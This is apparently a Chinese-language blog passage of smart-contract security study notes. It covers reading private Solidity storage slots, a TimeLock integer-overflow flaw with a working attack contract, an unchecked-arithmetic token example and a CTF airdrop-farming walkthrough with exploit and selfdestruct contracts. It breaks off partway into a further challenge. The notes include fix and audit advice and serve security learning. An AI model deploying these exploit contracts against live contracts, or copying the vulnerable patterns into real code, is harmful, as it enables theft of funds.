<h1 id="3访问私有变量"><a href="#3访问私有变量" class="headerlink" title="3访问私有变量"></a>3访问私有变量</h1><p>其中访问私有变量一般分为俩种一种是访问静态变量一种是访问动态变量，其中静态变量一般是可以直接利用cast 指令直接读出来，但是有一些动态变量是没办法直接读出来的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity ^0.8.18;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">    //字符串，数组，映射，静态的变量</span><br><span class="line">    uint256 number;</span><br><span class="line">    uint256[] shengri;</span><br><span class="line">    mapping(address =&gt; uint256) balance;</span><br><span class="line">    mapping(address =&gt; uint256) balance2;</span><br><span class="line">    string xingming;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        number = 2023054115;</span><br><span class="line">        xingming = &quot;wangjianfengwangjianfeng&quot;;</span><br><span class="line">        shengri.push(2005);</span><br><span class="line">        shengri.push(1);</span><br><span class="line">        shengri.push(18);</span><br><span class="line">        balance[0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266] = 10000;</span><br><span class="line">        balance2[0x70997970C51812dc3A010C7d01b50e0d17dc79C8] = 10000;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用forge create 在本地链直接部署上</p>
<p><img src="C:\Users\31320\AppData\Roaming\Typora\typora-user-images\image-20241013155345844.png" alt="image-20241013155345844"></p>
<p>其中这个就是直接查看槽0的变量，可以直接查看到学号</p>
<p>对于动态数组和字符串</p>
<p><img src="C:\Users\31320\AppData\Roaming\Typora\typora-user-images\image-20241013155859084.png" alt="image-20241013155859084"></p>
<p>直接利用cast读取会显现：</p>
<p>其中字符串是关于字符串的长度，对于动态数组是关于动态数组的个数。</p>
<p>如果想查看那么就需要chisel来解决</p>
<p><img src="https://raw.githubusercontent.com/sanyedegushi/images/master/images/image-20241013160737820.png" alt="image-20241013160737820"></p>
<p>我们无法直接cast storage 直接查看但是可以利用查看 槽四的哈希值直接查看，对于这个字符串它超过了31字节，所有我们仅仅查看四槽的哈希是不够的，所有我们只需要在查出的四槽哈希中添加1就行了，把俩段组合起来然后再利用cast 指令转换就可以到的我们字符串的东西了。</p>
<p>对于动态数组，也是按照这个步骤</p>
<p><img src="C:\Users\31320\AppData\Roaming\Typora\typora-user-images\image-20241013162157849.png" alt="image-20241013162157849"></p>
<p>如果想要查看动态数组里面第几个数，我们可以直接在原有的哈希值加上</p>
<p>其中对于mapping我们如果直接查看他的storage是查不到的</p>
<p><img src="https://raw.githubusercontent.com/sanyedegushi/images/master/images/image-20241013161201834.png" alt="image-20241013161201834"></p>
<p>所以我们想要查看还是要利用chisel 来解决</p>
<p><img src="C:\Users\31320\AppData\Roaming\Typora\typora-user-images\image-20241013161702398.png" alt="image-20241013161702398"></p>
<p>道理也是直接查找哈希值，但是想要查看mapping的格式是abi.encode(key,slot)</p>
<h1 id="4溢出漏洞"><a href="#4溢出漏洞" class="headerlink" title="4溢出漏洞"></a>4溢出漏洞</h1><p>算术溢出简称为溢出， 分为上溢和下溢，所谓上溢是指在运行单项数值计算时，当计算产生出来的结果非常大，大于寄存器或存储器所能存储或表示的能力限制就会产生上溢，例如在 solidity 中，uint8 所能表示的范围是 0 - 255 这 256 个数，当使用 uint8 类型在实际运算中计算 255 + 1 是会出现上溢的，这样计算出来的结果为 0 也就是 uint8 类型可表示的最小值。同样的，下溢就是当计算产生出来的结果非常小，小于寄存器或存储器所能存储或表示的能力限制就会产生下溢。例如在 Solidity 中，当使用 uint8 类型计算 0 - 1 时就会产生下溢，这样计算出来的值为 255 也就是 uint8 类型可表示的最大值。</p>
<p>&#x2F;&#x2F; SPDX-License-Identifier: MIT</p>
<p>pragma solidity ^0.7.6;</p>
<p>&#x2F;&#x2F;主要作用是允许用户存入以太币（Ether）并将其锁定一段时间，在锁定时间过期后才能提取存入的以太币</p>
<p>contract TimeLock {</p>
<p>  mapping(address &#x3D;&gt; uint256) public balances; &#x2F;&#x2F;存储每个地址的以太坊余额</p>
<p>  mapping(address &#x3D;&gt; uint256) public lockTime; &#x2F;&#x2F;存储每个地址的锁定到期时间</p>
<p>  &#x2F;&#x2F;允许用户存入以太币，并且锁定的到期时间为当前时间加一周。</p>
<p>  function deposit() external payable {</p>
<p>​    balances[msg.sender] +&#x3D; msg.value;</p>
<p>​    lockTime[msg.sender] &#x3D; block.timestamp + 1 weeks;</p>
<p>  }</p>
<p>  &#x2F;&#x2F; 允许用户增加锁定的时间</p>
<p>  function increaseLockTime(uint _secondsToIncrease) public {</p>
<p>​    lockTime[msg.sender] +&#x3D; _secondsToIncrease;</p>
<p>  }</p>
<p>  function withdraw() public {</p>
<p>​    require(balances[msg.sender] &gt; 0, “Insufficient funds”);&#x2F;&#x2F;要求账户有钱</p>
<p>​    require(</p>
<p>​      block.timestamp &gt; lockTime[msg.sender],</p>
<p>​      “Lock time not expired”</p>
<p>​    );&#x2F;&#x2F;判断是否已经在解锁的时间</p>
<p>​    uint amount &#x3D; balances[msg.sender];&#x2F;&#x2F;获取账户余额</p>
<p>​    balances[msg.sender] &#x3D; 0;&#x2F;&#x2F;将用户的账户余额设为0</p>
<p>​    &#x2F;&#x2F;将以太坊发送给客户，并检查是否成功</p>
<p>​    (bool sent, ) &#x3D; msg.sender.call{value: amount}(“”);</p>
<p>​    require(sent, “Failed to send Ether”);</p>
<p>  }</p>
<p>}</p>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先发下这个合约的increaseLockTime函数和deposit函数具有运算功能（合约是0.7.6向上兼容，所以在溢出的时候不会报错。</p>
<ol>
<li><p>deposit 函数存在两个运算操作，第一个是影响用户存入的余额 balances 的，这里传入的参数是可控的所以这里会有溢出的风险，另一个是影响用户的锁定时间 lockTime 的，但是这里的运算逻辑是每次调用 deposit 存入代币时会给 lockTime 增加一周，由于这里的参数不可控所以这个运算不会存在溢出风险。</p>
</li>
<li><p>increaseLockTime 函数是根据用户传入的 _secondsToIncrease 参数来进行运算从而改变用户的存入代币的锁定时间的，由于这里的 _secondsToIncrease 参数是可控的，所以这里有溢出的风险。</p>
</li>
</ol>
<p>综上所述，我们发现可利用的参数有两个，分别为 <strong>deposit 函数中的 balances 参数</strong>和 <strong>increaseLockTime 函数中的 _secondsToIncrease 参数</strong>。</p>
<p>我们先来看 <strong>balances</strong> 参数，如果要让这个参数溢出我们需要有足够的资金存入才可以（需要 2^256 个代币存入才能导致 balances 溢出并归零），如果要利用这个溢出漏洞的话，我们把大量资金存入自己的账户并让自己的账户的 balances 溢出并归零从而清空自己的资产，我觉得在坐的各位没有人会这么做吧。所以这个参数可以认为在攻击者的角度是不可用的。</p>
<p>我们再看 <strong>_secondsToIncrease</strong> 参数，这个参数是我们调用 increaseLockTime 函数来增加存储时间时传入的，这个参数可以决定我们什么时候可以将自己存入并锁定的代币从合约中取出，我们可以看到这个参数在传入之后是直接与账户对应的锁定时间 lockTime 进行运算的，如果我们操纵 _secondsToIncrease 参数让他在与 lockTime 进行运算后得到的结果产生溢出并归零的话这样我们是不是就可以在存储日期到期前将自己账户中的余额取出了呢？</p>
<h2 id="攻击合约-1"><a href="#攻击合约-1" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.7.6;</span><br><span class="line">import &#123;TimeLock&#125; from &quot;./TimeLock.sol&quot;;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">  TimeLock timeLock;</span><br><span class="line">  constructor(TimeLock _timeLock) &#123;</span><br><span class="line">  timeLock = TimeLock(_timeLock);</span><br><span class="line">  &#125;</span><br><span class="line">  fallback() external payable &#123;&#125;</span><br><span class="line">  function attack() public payable &#123;</span><br><span class="line">   timeLock.deposit&#123;value: msg.value&#125;();</span><br><span class="line">   timeLock.increaseLockTime(</span><br><span class="line">     type(uint).max + 1 - timeLock.lockTime(address(this))</span><br><span class="line">   );</span><br><span class="line"> timeLock.withdraw();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>溢出漏洞的攻击合约具体思路：</p>
<p>使用 Attack 攻击合约先存入以太后利用合约的溢出漏洞在存储未到期的情况下提取我们在刚刚 TimeLock 合约中存入并锁定的以太：</p>
<p>1 部署TimeLock合约</p>
<p>2.部署攻击合约</p>
<ol start="3">
<li><p>调用 Attack.attack 函数，Attack.attack 又调用 TimeLock.deposit 函数向 TimeLock 合约中存入一个以太（此时这枚以太将被 TimeLock 锁定一周的时间），之后 Attack.attack 又调用 TimeLock.increaseLockTime 函数并传入 uint 类型可表示的最大值（2^256 - 1）加 1 再减去当前 TimeLock 合约中记录的锁定时间。此时 TimeLock.increaseLockTime 函数中的 lockTime 的计算结果为 2^256 这个值，在 uint256 类型中 2^256 这个数存在上溢所以计算结果为 2^256 &#x3D; 0 此时我们刚刚存入 TimeLock 合约中的一个以太的锁定时间就变为 0 ；</p>
</li>
<li><p>这时 Attack.attack 再调用 TimeLock. withdraw 函数将成功通过 block.timestamp &gt; lockTime[msg.sender] 这项检查让我们能够在存储时间未到期的情况下成功提前取出我们刚刚在 TimeLock 合约中存入并锁定的那个以太。</p>
</li>
</ol>
<h2 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h2><p><strong>（1）作为开发者</strong></p>
<ol>
<li><p>使用 SafeMath 来防止溢出；</p>
</li>
<li><p>使用 Solidity 0.8 及以上版本来开发合约并慎用 unchecked 因为在 unchecked 修饰的代码块里面是不会对参数进行溢出检查的；</p>
</li>
<li><p>需要慎用变量类型强制转换，例如将 uint256 类型的参数强转为 uint8 类型由于两种类型的取值范围不同也可能会导致溢出。</p>
</li>
</ol>
<p><strong>（2）作为审计者</strong></p>
<ol>
<li><p>首先查看合约版本是否在 Solidity 0.8 版本以下或者是否存在 unchecked 修饰的代码块，如果存在则优先检查参数的溢出可能并确定影响范围；</p>
</li>
<li><p>如果合约版本在 Solidity 0.8 版本以下则需要查看合约是否引用了 SafeMath；</p>
</li>
<li><p>如果使用了 SafeMath 我们需要注意合约中有没有强制类型转换，如果有的话则可能会存在溢出的风险；</p>
</li>
<li><p>如果没有使用 SafeMath 且合约中存在算术运算的我们就可以认为这个合约是可能存在溢出风险的，在实际审计中还要结合实际代码来看。</p>
</li>
</ol>
<h1 id="5整型溢出"><a href="#5整型溢出" class="headerlink" title="5整型溢出"></a>5整型溢出</h1><h2 id="漏洞合约例子"><a href="#漏洞合约例子" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><p>下面这个例子是一个简单的代币合约，参考了 <code>Ethernaut</code> 中的合约。它有 <code>2</code> 个状态变量：<code>balances</code> 记录了每个地址的余额，<code>totalSupply</code> 记录了代币总供给。</p>
<p>它有 <code>3</code> 个函数：</p>
<ul>
<li>构造函数：初始化代币总供给。</li>
<li><code>transfer()</code>：转账函数。</li>
<li><code>balanceOf()</code>：查询余额函数。</li>
</ul>
<p>由于solidity <code>0.8.0</code> 版本之后会自动检查整型溢出错误，溢出时会报错。如果我们要重现这种漏洞，需要使用 <code>unchecked</code> 关键字，在代码块中临时关掉溢出检查，就像我们在 <code>transfer()</code> 函数中做的那样。</p>
<p>这个例子中的漏洞就出现在<code>transfer()</code> 函数中，<code>require(balances[msg.sender] - _value &gt;= 0);</code> 这个检查由于整型溢出，永远都会通过。因此用户可以无限转账。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    unchecked&#123;</span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="预防办法"><a href="#预防办法" class="headerlink" title="预防办法"></a>预防办法</h2><ol>
<li>Solidity <code>0.8.0</code> 之前的版本，在合约中引用 <a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol">Safemath 库</a>，在整型溢出时报错。</li>
<li>Solidity <code>0.8.0</code> 之后的版本内置了 <code>Safemath</code>，因此几乎不存在这类问题。开发者有时会为了节省gas使用 <code>unchecked</code> 关键字在代码块中临时关闭整型溢出检测，这时要确保不存在整型溢出漏洞。</li>
</ol>
<h1 id="6薅羊毛漏洞"><a href="#6薅羊毛漏洞" class="headerlink" title="6薅羊毛漏洞"></a>6薅羊毛漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract skybank&#123;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line">    event sendflag(string base64email,string md5namectf);</span><br><span class="line">    bytes20 addr = bytes20(msg.sender);</span><br><span class="line"></span><br><span class="line">    function ObtainFlag(string base64email,string md5namectf)&#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= 1000000000);</span><br><span class="line">        emit sendflag(base64email,md5namectf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function gether() public &#123;</span><br><span class="line">        require(balances[msg.sender] == 0);</span><br><span class="line">        balances[msg.sender] += 10000000;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    function Transfer(address to, uint bur) public &#123;</span><br><span class="line">        require(bur == balances[msg.sender]);</span><br><span class="line">        balances[to] += bur;</span><br><span class="line">        balances[msg.sender] -= bur;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析"><a href="#合约分析" class="headerlink" title="合约分析"></a>合约分析</h5><p>先来看题目最终的判断函数ObtainFlag()：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function ObtainFlag(string base64email,string md5namectf)&#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= 1000000000);</span><br><span class="line">    emit sendflag(base64email,md5namectf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从该函数可以看出，obtainFlag()函数传入两个参数（base64email，md5namectf），函数第一行代码require(balances[msg.sender] &gt;&#x3D; 1000000000);会判断调用者地址余额是否大于等于1000000000 wei，如果满足该条件，则执行emit sendflag(base64email,md5namectf);代码，从题目可以得出，只要参赛者触发sendflag事件并将参数输出表示获取flag成功。</p>
<p>由于参赛者初始调用题目合约skybank时，调用地址在所属合约的资金为0，所以需要通过合约逻辑获取资金，继续来看获取空投函数gether()：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function gether() public &#123;</span><br><span class="line">    require(balances[msg.sender] == 0);</span><br><span class="line">    balances[msg.sender] += 10000000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gether()函数中，第一句代码require(balances[msg.sender] &#x3D;&#x3D; 0);判断当前调用者的地址是否为0，如果满足条件，则给该调用者加10000000 wei的资金，我们最终触发sendflag事件的ObtainFlag()函数中，需要1000000000 wei，所以只要调用gether超过100次就可以触发sendflag事件。</p>
<p>继续分析合约的转账函数Transfer()：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function Transfer(address to, uint bur) public &#123;</span><br><span class="line">    require(bur == balances[msg.sender]);</span><br><span class="line">    balances[to] += bur;</span><br><span class="line">    balances[msg.sender] -= bur;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Transfer()函数中，首先第一行代码require(bur &#x3D;&#x3D; balances[msg.sender]);判断传入的参数bur和目前调用者地址的余额是否相等，如果条件满足，将该余额转至传入的地址to中，之后将调用者地址的余额减掉。这里非常重要的一点是：转账之后的调用者地址余额再次变为0，也就是说我们可以重复该函数进行转账。</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>通过以上skybank题目合约分析，可以总结出两种解题思路：</p>
<p>第一种：</p>
<ul>
<li>通过A地址调用gether()函数获取空投</li>
<li>调用Transfer()函数将A地址余额转至B地址</li>
<li>重新使用A地址调用gether()函数获取空投，并将余额转至B地址（不断循环）</li>
<li>使用B地址调用ObtainFlag()并触发事件</li>
</ul>
<p>第二种：</p>
<ul>
<li>使用多个地址调用gether()获取空投</li>
<li>将获取空投汇聚至固定地址</li>
<li>通过该固定地址调用ObtainFlag()并触发事件</li>
</ul>
<h3 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h3><p>我们进行第一种解题思路的攻击演示，使用Remix+MetaMask对攻击合约进行部署调用</p>
<h4 id="1-自毁给题目合约转币"><a href="#1-自毁给题目合约转币" class="headerlink" title="1. 自毁给题目合约转币"></a>1. 自毁给题目合约转币</h4><p>由于题目合约的初始状态没有ether，故我们通过自毁函数，强行将ether转入题目合约地址，虽然当前题目合约有一定资金。为了攻击完整性，也演示一次自毁。</p>
<p>构造自毁合约：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract burn &#123;</span><br><span class="line"></span><br><span class="line">	function kill() public payable &#123;</span><br><span class="line">    	selfdestruct(address(0xe6bebc078bf01c06d80b39e0bb654f70c7b0c273));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署burn合约，并利用kill()函数带入0.02Ether进行自毁，将Ether发送到题目合约地址。</p>
<p><img src="https://img.learnblockchain.cn/2021/01/18_/736063889.jpeg" alt="自毁.png"></p>
<h3 id="2-使用A地址部署最终调用者attack2（合约地址D）"><a href="#2-使用A地址部署最终调用者attack2（合约地址D）" class="headerlink" title="2 使用A地址部署最终调用者attack2（合约地址D）"></a>2 使用A地址部署最终调用者attack2（合约地址D）</h3><p>pragma solidity ^0.4.24;</p>
<p>interface skybankInterface {</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function ObtainFlag(string base64email, string md5namectf);</span><br></pre></td></tr></table></figure>

<p>}</p>
<p>contract attacker2 {</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">skybankInterface constant private target = skybankInterface(0xE6BEBc078Bf01C06D80b39E0bb654F70C7B0C273);</span><br><span class="line"></span><br><span class="line">function exploit() &#123;</span><br><span class="line"></span><br><span class="line">    target.ObtainFlag(&quot;zxc&quot;, &quot;000&quot;);</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>

<p>}</p>
<p>部署成功</p>
<p><img src="https://img.learnblockchain.cn/2021/01/18_/495517028.jpeg" alt="21.png"></p>
<h3 id="3-使用b地址部署获取空投的合约attac（合约E"><a href="#3-使用b地址部署获取空投的合约attac（合约E" class="headerlink" title="3.使用b地址部署获取空投的合约attac（合约E)"></a>3.使用b地址部署获取空投的合约attac（合约E)</h3><p>调用代码：Transfer传入的地址参数为D地址</p>
<p>pragma solidity ^0.4.24;</p>
<p>interface skybankInterface {<br>    function gether() external;<br>    function Transfer(address to, uint256 env) external;<br>}</p>
<p>contract attacker {</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">skybankInterface constant private target = skybankInterface(0xe6bebc078bf01c06d80b39e0bb654f70c7b0c273);</span><br><span class="line"></span><br><span class="line">function exploit(uint256 len) public payable &#123;</span><br><span class="line">    </span><br><span class="line">    for(uint256 i=0; i&lt;len; i++)&#123;</span><br><span class="line">        </span><br><span class="line">        target.gether();</span><br><span class="line">        target.Transfer(0xB8EBd7aaD718F65e61c0fC8359Dc5f9B5b85b067,10000000);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>}</p>
<p>部署成功<img src="https://img.learnblockchain.cn/2021/01/18_/148553332.jpeg" alt="32.png"></p>
<p>调用exploit()<img src="https://img.learnblockchain.cn/2021/01/18_/619368490.jpeg" alt="33.png">函数并传入参数101，获取101次空投</p>
<p>获取空投成功</p>
<p><img src="https://img.learnblockchain.cn/2021/01/18_/704344985.jpeg" alt="34.png"></p>
<h4 id="4-使用A地址调用D合约的exploit-函数"><a href="#4-使用A地址调用D合约的exploit-函数" class="headerlink" title="4.使用A地址调用D合约的exploit()函数"></a>4.使用A地址调用D合约的exploit()函数</h4><p>通过获取到的ether调用exploit()函数触发题目合约的sendflag事件</p>
<p><img src="https://img.learnblockchain.cn/2021/01/18_/487742238.jpeg" alt="41.png"></p>
<p>成功触发事件</p>
<p><img src="https://img.learnblockchain.cn/2021/01/18_/30317417.jpeg" alt="42.png"></p>
<p>至此，攻击完成</p>
<h1 id="7abi-encode和abi-encodePacked的区别"><a href="#7abi-encode和abi-encodePacked的区别" class="headerlink" title="7abi.encode和abi.encodePacked的区别"></a>7abi.encode和abi.encodePacked的区别</h1><p>直接用一个例子解释</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abi.encode(&quot;wang&quot;,&quot;jian&quot;) != abi.encode(&quot;wangj&quot;,&quot;ian&quot;)</span><br><span class="line">abi.encodePacked(&quot;wang&quot;,&quot;jian&quot;) == abi.encodePacked(&quot;wangj&quot;,&quot;ian&quot;)</span><br></pre></td></tr></table></figure>

<p><strong>解释</strong>：</p>
<ul>
<li><p><code>abi.encode</code> <strong>会进行 32 字节对齐</strong>，每个参数都存储在单独的 32 字节（word）中。</p>
</li>
<li><p><code>&quot;wang&quot;</code> 和 <code>&quot;jian&quot;</code> 会分别存储在不同的 32 字节位置，并且带有长度信息。</p>
</li>
<li><p><code>&quot;wangj&quot;</code> 和 <code>&quot;ian&quot;</code> 也是独立存储的，最终编码结果完全不同，因此 <strong>不相等</strong>。</p>
</li>
<li><p><code>abi.encodePacked</code> <strong>不会进行 32 字节对齐</strong>，而是<strong>紧密拼接</strong>所有参数的字节。</p>
</li>
<li><p><code>&quot;wang&quot; + &quot;jian&quot;</code> 直接变成 <code>&quot;wangjian&quot;</code>。</p>
</li>
<li><p><code>&quot;wangj&quot; + &quot;ian&quot;</code> 也变成 <code>&quot;wangjian&quot;</code>，所以最终的编码结果相同。</p>
</li>
</ul>
<p>因此 <strong>相等</strong>。</p>
<p>接下来直接用一个题来进一步的熟悉这个漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span 